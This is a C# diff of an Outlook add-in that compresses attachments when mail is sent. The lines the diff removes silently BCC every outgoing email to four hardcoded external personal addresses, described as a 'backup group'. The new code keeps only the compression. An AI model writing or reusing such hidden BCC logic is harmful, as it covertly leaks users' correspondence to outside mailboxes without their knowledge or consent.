@@ -1,20 +1,19 @@
 ﻿using Microsoft.Office.Interop.Outlook;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using Outlook = Microsoft.Office.Interop.Outlook;
 
 namespace AutoZipAttachments
 {
     public partial class ThisAddIn
     {
-        private IEmailSender _emailSender;
+        
         private void ThisAddIn_Startup(object sender, System.EventArgs e)
         {
-            //Application.ItemSend += new ApplicationEvents_11_ItemSendEventHandler(CompressAttachments);
-            _emailSender = new EmailSender();
-            Application.Inspectors.NewInspector += NewInspectorHandler;
+             Application.ItemSend += new Outlook.ApplicationEvents_11_ItemSendEventHandler(Application_ItemSend);
 
-            Application.ItemSend += Application_ItemSend;
+            
         }
 
         private void NewInspectorHandler(Inspector inspector)
@@ -32,29 +31,19 @@ namespace AutoZipAttachments
         }
 
        
-        private void Application_ItemSend(object Item, ref bool cancel)
+        private void Application_ItemSend(object item, ref bool cancel)
         {
-            Outlook.MailItem mailItem = Item as Outlook.MailItem;
-            if (mailItem != null)
-            {
-                // Compress attachments before sending
-                string outputPath = @"E:\temp"; // Define your desired output path
-                _emailSender.CompressAttachments(mailItem, outputPath);
-                if (mailItem.Recipients.Count > 0)
-                {
-                    
-                    mailItem.Save();
-                    if (mailItem.Recipients.Count > 0)
-                    {
-                        _emailSender.AddCC(mailItem);
 
-                        // Add the backup group to the BCC field
-                        string[] bccGroup = new string[] { "tonvqsgc@outlook.com", "tonqvu@gmail.com", "vuquangton@outlook.com", "vuquangton@ymail.com" };
-                        _emailSender.AddBCC(mailItem, bccGroup);
-                    }
-                }
-                //_emailSender.MoveTempDirectoryToSystemTemp(outputPath);
-               _emailSender.FormatEmail(mailItem);
+            if (item is Outlook.MailItem mailItem)
+            {
+                string outputPath = Path.GetTempPath(); // Define your output path here
+
+                IEmailFormatter emailFormatter = new EmailFormatter();
+                IEmailRecipientManager emailRecipientManager = new EmailRecipientManager();
+                IAttachmentCompressor attachmentCompressor = new AttachmentCompressor();
+
+                EmailSender emailSender = new EmailSender(emailFormatter, emailRecipientManager, attachmentCompressor);
+                emailSender.CompressAttachments(mailItem, outputPath);
             }
         }
 
